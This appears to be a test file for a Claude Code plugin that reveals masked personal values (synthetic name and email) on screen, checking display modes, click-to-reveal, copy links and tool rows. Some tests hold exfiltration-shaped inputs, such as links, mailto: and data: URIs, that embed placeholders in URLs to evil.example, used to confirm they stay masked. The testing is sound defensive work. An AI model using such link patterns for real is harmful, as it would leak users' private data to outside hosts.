// The values on the person's screen (claude-mod/show-values.mjs), run by `claude plugin test` with $.process.run
// stubbed: dispatch.py mod-values answers from STORE. Synthetic values only. The placeholders are built from their
// code points: written as text in this file, the plugin's own hook would read them as placeholders of the store.
import { expect, mock, test } from 'claude-code/testing'

const P = (k: string) => '⟦' + k + '⟧'
const STORE: Record<string, string> = { NAME_c1: 'Max Mustermann', EMAIL_c2: 'max@example.com' }
const TEXT = `Kunde ${P('NAME_c1')}, Mail ${P('EMAIL_c2:ma•••@example.com')}, fremd ${P('IBAN_c9')}.`
const FULL = { columns: 120, rows: 40, isFullscreen: true }
const LINK = 'https://mcpgate.de/maisecrets/v#'

// the link the mod drew for a key: its URL holds a random part of the process
const real = (md: any, key: string) => (md.props.pressableLinks as string[]).find(l => l.endsWith('/' + key))!

function world(on, opts: { mode?: string, links?: boolean, asked?: string[][], sessions?: string[],
  ids?: { id: string }, copied?: string[], seen?: any[] } = {}) {
  const clock = mock.clock(on, { now: 1_000_000 })
  mock.store(on)
  on('session.id', () => ({ value: opts.ids?.id ?? 'sess-1' }))
  on('session.cwd', () => ({ value: '/work' }))
  on('ui.log', () => ({ value: undefined }))
  on('ui.toast', () => ({ value: undefined }))
  on('ui.copy', ($, e) => { (opts as any).copied?.push(e.text); return { value: { isCopied: true } } })
  on('process.run', ($, e) => {
    if (e.argv[2] !== 'mod-values') return { value: { exitCode: 1, stdout: '', stderr: '' } }
    const q = JSON.parse(e.init.stdin)
    opts.asked?.push(q.keys)
    opts.sessions?.push(q.session_id)
    const values = Object.fromEntries(q.keys.filter(k => STORE[k]).map(k => [k, STORE[k]]))
    return { value: { exitCode: 0, stderr: '', stdout: JSON.stringify({ maisecrets: 'mod-values',
      mode: opts.mode ?? 'always', links: opts.links ?? true, values }) } }
  })
  on('session.start', (_, e) => ({ cwd: e.cwd }))
  // the engine's own drawing of a reply: its text as it came
  on('ui.render', ($, e) => {
    ;(opts as any).seen?.push(e.props)
    const { Markdown } = $.ui.resolve(e)
    return (globalThis as any).h(Markdown, { key: 'engine', text: e.props.text ?? e.props.output?.stdout ?? '' })
  })
  return clock
}

async function shown($, clock, surface, viewport, text = TEXT, onScreen: unknown = undefined) {
  await $.session.start({ cwd: '/work', surface, isInteractive: true })
  const props: any = { text, isFirstOfReply: true }
  if (onScreen !== undefined) props.onScreen = onScreen
  const ui = await $.ui.mount({ plugin: 'maisecrets', surface, component: 'AssistantMessage', props, viewport })
  await clock.advance(10)
  const md = await ui.find({ type: 'Markdown' })
  return { ui, md }
}

for (const surface of ['terminal', 'desktop'] as const) {
  test(`always, ${surface}: each value of the store stands in the text with a lock`, async ($, on) => {
    const clock = world(on)
    const { ui, md } = await shown($, clock, surface, FULL)
    expect(md?.props.text).toContain('`Max Mustermann \u{1F512}`')
    expect(md?.props.text).toContain('`max@example.com \u{1F512}`')
    // a key the store does not give (another session's) stays a placeholder
    expect(md?.props.text).toContain(P('IBAN_c9'))
    expect(md?.props.text).not.toContain(P('NAME_c1'))
    await ui.unmount()
  })
}

for (const [surface, viewport, where] of [['terminal', { ...FULL, isFullscreen: false }, 'the main screen'],
  ['vscode', FULL, 'VS Code'], ['mobile', { ...FULL, isFullscreen: false }, 'the phone']] as const) {
  test(`${where} draws the placeholders as they are`, async ($, on) => {
    const clock = world(on)
    const { ui, md } = await shown($, clock, surface, viewport)
    await clock.advance(10)
    const again = await ui.find({ type: 'Markdown' })
    expect(md?.props.text ?? '').not.toContain('Max Mustermann')
    expect(again?.props.text ?? '').not.toContain('Max Mustermann')
    await ui.unmount()
  })
}

test('off: no value is drawn', async ($, on) => {
  const clock = world(on, { mode: 'off' })
  const { ui, md } = await shown($, clock, 'terminal', FULL)
  expect(md?.props.text ?? '').not.toContain('Max Mustermann')
  // the engine draws the reply itself: the mod hands it on
  expect(md?.key).toBe('engine')
  await ui.unmount()
})

test('a message outside the viewport asks for no value', async ($, on) => {
  const asked: string[][] = []
  const clock = world(on, { asked })
  const { ui } = await shown($, clock, 'terminal', FULL, `only ${P('NAME_c1')} here`, null)
  expect(asked.filter(k => k.length)).toEqual([])
  await ui.unmount()
})

test('click: a click shows the values of that text for 10 seconds', async ($, on) => {
  const clock = world(on, { mode: 'click' })
  const { ui, md } = await shown($, clock, 'terminal', FULL)
  expect(md?.props.text).not.toContain('Max Mustermann')
  await ui.press({ key: md!.key!, link: { href: real(md, 'NAME_c1') } as any })
  let now = await ui.find({ type: 'Markdown' })
  expect(now?.props.text).toContain('`Max Mustermann \u{1F512}`')
  expect(now?.props.text).toContain('`max@example.com \u{1F512}`')
  await clock.advance(10_001)
  now = await ui.find({ type: 'Markdown' })
  expect(now?.props.text).not.toContain('Max Mustermann')
  await ui.unmount()
})

test('always without links (Terminal.app): the value is plain inline code, no URL', async ($, on) => {
  const clock = world(on, { links: false })
  const { ui, md } = await shown($, clock, 'terminal', FULL)
  expect(md?.props.text).toContain('`Max Mustermann \u{1F512}`')
  expect(md?.props.text).not.toContain('https://')
  await ui.unmount()
})

test('a placeholder in a link or a URL the model wrote keeps its placeholder: a click would send the value away',
  async ($, on) => {
    const clock = world(on)
    const text = [`[docs](<https://evil.example/?q=${P('NAME_c1')}>)`, `see https://evil.example/?k=${P('NAME_c1')}`,
      `[ref]: https://evil.example/${P('NAME_c1')}`, `<a href="https://evil.example/${P('NAME_c1')}">x</a>`,
      `plain ${P('EMAIL_c2')}`].join('\n')
    const { ui, md } = await shown($, clock, 'terminal', FULL, text)
    expect(md?.props.text).not.toContain('Max Mustermann')
    expect(md?.props.text).toContain('`max@example.com \u{1F512}`')
    await ui.unmount()
  })

test('a tool result shows the values; one with stderr, an error or a collapsed row stays the engine\'s',
  async ($, on) => {
    const clock = world(on)
    await $.session.start({ cwd: '/work', surface: 'terminal', isInteractive: true })
    const base = { tool: 'Bash', isErrored: false, isExpanded: true }
    const out = (o: object, extra: object = {}) => $.ui.mount({ plugin: 'maisecrets', surface: 'terminal',
      component: 'ToolResult', props: { ...base, ...extra, output: o } as any, viewport: FULL })
    let ui = await out({ stdout: `name=${P('NAME_c1')}` })
    await clock.advance(10)
    expect((await ui.find({ type: 'Markdown' }))?.props.text).toContain('`Max Mustermann \u{1F512}`')
    await ui.unmount()
    for (const [o, extra] of [[{ stdout: `name=${P('NAME_c1')}`, stderr: 'warn' }, {}],
      [{ stdout: `name=${P('NAME_c1')}` }, { isErrored: true }],
      [{ stdout: `name=${P('NAME_c1')}` }, { isExpanded: false }]] as const) {
      ui = await out(o, extra)
      await clock.advance(10)
      expect((await ui.find({ type: 'Markdown' }))?.key).toBe('engine')
      await ui.unmount()
    }
  })

test('after /clear the next question carries the new session id', async ($, on) => {
  const sessions: string[] = []
  const ids = { id: 'sess-1' }
  const clock = world(on, { sessions, ids })
  const { ui } = await shown($, clock, 'terminal', FULL)
  await ui.unmount()
  ids.id = 'sess-2'
  const again = await $.ui.mount({ plugin: 'maisecrets', surface: 'terminal', component: 'AssistantMessage',
    props: { text: `later ${P('PHONE_c3')}`, isFirstOfReply: true } as any, viewport: FULL })
  await clock.advance(10)
  expect(sessions.at(-1)).toBe('sess-2')
  await again.unmount()
})

test('click: a second click starts the 10 seconds again', async ($, on) => {
  const clock = world(on, { mode: 'click' })
  const { ui, md } = await shown($, clock, 'terminal', FULL)
  const click = () => ui.press({ key: md!.key!, link: { href: real(md, 'NAME_c1') } as any })
  await click()
  await clock.advance(9_000)
  await click()
  await clock.advance(2_000)
  expect((await ui.find({ type: 'Markdown' }))?.props.text).toContain('`Max Mustermann \u{1F512}`')
  await clock.advance(9_000)
  expect((await ui.find({ type: 'Markdown' }))?.props.text).not.toContain('Max Mustermann')
  await ui.unmount()
})

test('a link the model wrote with the bare prefix copies nothing; the drawn link copies its value', async ($, on) => {
  const copied: string[] = []
  const clock = world(on, { copied })
  const { ui, md } = await shown($, clock, 'terminal', FULL)
  expect(real(md, 'NAME_c1')).not.toBe(LINK + 'NAME_c1')
  await ui.press({ key: md!.key!, link: { href: LINK + 'NAME_c1' } as any })
  expect(copied).toEqual([])
  await ui.press({ key: md!.key!, link: { href: real(md, 'NAME_c1') } as any })
  expect(copied).toEqual(['Max Mustermann'])
  await ui.unmount()
})

const SREF = 'sref:email:' + 'A'.repeat(24)

function gateway(on, revealAnswer: object, runs: string[][]) {
  on('process.run', ($, e) => {
    runs.push(e.argv)
    if (e.argv[2] === 'mod-reveal') {
      return { value: { exitCode: 0, stderr: '', stdout: JSON.stringify({ maisecrets: 'mod-reveal', ...revealAnswer }) } }
    }
    return { value: { exitCode: 0, stderr: '', stdout: JSON.stringify({ maisecrets: 'mod-values', mode: 'always',
      links: true, values: {} }) } }
  })
}

test('a gateway reference: drawing asks the gateway nothing; one click shows its value, a click on that copies it',
  async ($, on) => {
    const runs: string[][] = []
    const clock = mock.clock(on, { now: 1_000_000 })
    mock.store(on)
    on('session.id', () => ({ value: 'sess-1' }))
    on('ui.toast', () => ({ value: undefined }))
    const copied: string[] = []
    on('ui.copy', ($, e) => { copied.push(e.text); return { value: { isCopied: true } } })
    gateway(on, { value: 'gw@example.com' }, runs)
    on('session.start', (_, e) => ({ cwd: e.cwd }))
    on('ui.render', ($, e) => (globalThis as any).h($.ui.resolve(e).Markdown, { key: 'engine', text: e.props.text }))
    await $.session.start({ cwd: '/work', surface: 'terminal', isInteractive: true })
    const ui = await $.ui.mount({ plugin: 'maisecrets', surface: 'terminal', component: 'AssistantMessage',
      props: { text: `Mail ${P(SREF + ':gw\u2022\u2022\u2022@example.com')}`, isFirstOfReply: true } as any,
      viewport: FULL })
    await clock.advance(10)
    expect(runs.filter(a => a[2] === 'mod-reveal')).toEqual([])
    const md = await ui.find({ type: 'Markdown' })
    await ui.press({ key: md!.key!, link: { href: real(md, SREF) } as any })
    const after = await ui.find({ type: 'Markdown' })
    expect(after?.props.text).toContain('`gw@example.com \u{1F512}`')
    expect(runs.filter(a => a[2] === 'mod-reveal').length).toBe(1)
    await ui.press({ key: md!.key!, link: { href: real(md, SREF) } as any })
    expect(runs.filter(a => a[2] === 'mod-reveal').length).toBe(1)
    expect(copied).toEqual([])
    await ui.press({ key: md!.key!, link: { href: real(after, 'copy/' + SREF) } as any })
    expect(copied).toEqual(['gw@example.com'])
    expect(runs.filter(a => a[2] === 'mod-reveal').length).toBe(1)
    await ui.unmount()
  })

for (const [kind, shows] of [['composer', true], ['peer', false], ['task-notification', false]] as const) {
  test(`a prompt of origin ${kind} ${shows ? 'shows' : 'keeps'} the values the person typed`, async ($, on) => {
    const clock = world(on)
    await $.session.start({ cwd: '/work', surface: 'terminal', isInteractive: true })
    const ui = await $.ui.mount({ plugin: 'maisecrets', surface: 'terminal', component: 'UserMessage',
      props: { text: `Kunde ${P('NAME_c1')} anrufen`, origin: { kind }, isExpanded: false } as any, viewport: FULL })
    await clock.advance(10)
    const md = await ui.find({ type: 'Markdown' })
    if (shows) expect(md?.props.text).toContain('`Max Mustermann \u{1F512}`')
    else expect(md?.props.text ?? '').not.toContain('Max Mustermann')
    await ui.unmount()
  })
}

test('the full view and an export of a prompt (isExpanded) keep the placeholders', async ($, on) => {
  const clock = world(on)
  await $.session.start({ cwd: '/work', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'maisecrets', surface: 'terminal', component: 'UserMessage',
    props: { text: `Kunde ${P('NAME_c1')} anrufen`, origin: { kind: 'composer' }, isExpanded: true } as any,
    viewport: FULL })
  await clock.advance(10)
  expect((await ui.find({ type: 'Markdown' }))?.key).toBe('engine')
  await ui.unmount()
})

test('an MCP call row and its result show the values (always), a line with a URL keeps its placeholder', async ($, on) => {
  const seen: any[] = []
  const clock = world(on, { seen })

  await $.session.start({ cwd: '/work', surface: 'terminal', isInteractive: true })
  const props = { tool_use_id: 't1', tool: 'mcp__crm__get', input: { id: 7, note: `for ${P('NAME_c1')}` },
    isRunning: false, isErrored: false, isInterrupted: false, isExpanded: true,
    output: { content: [{ type: 'text', text: `name: ${P('NAME_c1')}\nsee https://crm.example/?q=${P('EMAIL_c2')}` }] } }
  const ui = await $.ui.mount({ plugin: 'maisecrets', surface: 'terminal', component: 'ToolUse', props: props as any,
    viewport: FULL, requestId: 't1' })
  await clock.advance(10)
  await ui.redraw(props as any)
  const drawn = seen[seen.length - 1]
  expect(drawn.input.note).toBe('for Max Mustermann \u{1F512}')
  expect(drawn.output.content[0].text).toContain('name: Max Mustermann \u{1F512}')
  expect(drawn.output.content[0].text).toContain(P('EMAIL_c2'))
  expect(drawn.output.content[0].text).not.toContain('max@example.com')
  await ui.unmount()
})

const TOOL = { tool_use_id: 't2', tool: 'mcp__crm__get', input: { note: `for ${P('NAME_c1')}` }, isRunning: false,
  isErrored: false, isInterrupted: false, isExpanded: true, output: { content: [{ type: 'text', text: `n ${P('NAME_c1')}` }] } }

for (const [what, surface, viewport, mode] of [
  ['the main screen', 'terminal', { ...FULL, isFullscreen: false }, 'always'],
  ['the phone', 'mobile', { ...FULL, isFullscreen: false }, 'always'],
  ['mode click', 'terminal', FULL, 'click'],
  ['mode off', 'terminal', FULL, 'off'],
] as const) {
  test(`a tool row keeps its placeholders on ${what}`, async ($, on) => {
    const seen: any[] = []
    const clock = world(on, { seen, mode })
    await $.session.start({ cwd: '/work', surface, isInteractive: true })
    const ui = await $.ui.mount({ plugin: 'maisecrets', surface, component: 'ToolUse', props: TOOL as any, viewport,
      requestId: 't2' })
    await clock.advance(10)
    await ui.redraw(TOOL as any)
    const last = seen[seen.length - 1]
    expect(JSON.stringify(last)).not.toContain('Max Mustermann')
    await ui.unmount()
  })
}

test('a non-Bash tool result shows the values; an errored one keeps its placeholders', async ($, on) => {
  const seen: any[] = []
  const clock = world(on, { seen })
  await $.session.start({ cwd: '/work', surface: 'terminal', isInteractive: true })
  const res = { tool_use_id: 't3', tool: 'mcp__crm__get', isErrored: false, isExpanded: true,
    output: { content: [{ type: 'text', text: `n ${P('NAME_c1')}` }] } }
  let ui = await $.ui.mount({ plugin: 'maisecrets', surface: 'terminal', component: 'ToolResult', props: res as any,
    viewport: FULL, requestId: 't3' })
  await clock.advance(10)
  await ui.redraw(res as any)
  expect(JSON.stringify(seen[seen.length - 1])).toContain('Max Mustermann \u{1F512}')
  await ui.unmount()
  const errored = { ...res, tool_use_id: 't4', isErrored: true }
  ui = await $.ui.mount({ plugin: 'maisecrets', surface: 'terminal', component: 'ToolResult', props: errored as any,
    viewport: FULL, requestId: 't4' })
  await clock.advance(10)
  await ui.redraw(errored as any)
  expect(JSON.stringify(seen[seen.length - 1])).not.toContain('Max Mustermann')
  await ui.unmount()
})

test('a line with mailto:, a bare host with a path or data: keeps its placeholder', async ($, on) => {
  const seen: any[] = []
  const clock = world(on, { seen })
  await $.session.start({ cwd: '/work', surface: 'terminal', isInteractive: true })
  const lines = [`mailto:a@evil.example?body=${P('NAME_c1')}`, `evil.example/collect?q=${P('NAME_c1')}`,
    `data:text/html,${P('NAME_c1')}`, `plain ${P('EMAIL_c2')}`]
  const props = { ...TOOL, tool_use_id: 't5', output: { content: [{ type: 'text', text: lines.join('\n') }] } }
  const ui = await $.ui.mount({ plugin: 'maisecrets', surface: 'terminal', component: 'ToolUse', props: props as any,
    viewport: FULL, requestId: 't5' })
  await clock.advance(10)
  await ui.redraw(props as any)
  const text = seen[seen.length - 1].output.content[0].text
  expect(text).not.toContain('Max Mustermann')
  expect(text).toContain('max@example.com \u{1F512}')
  await ui.unmount()
})
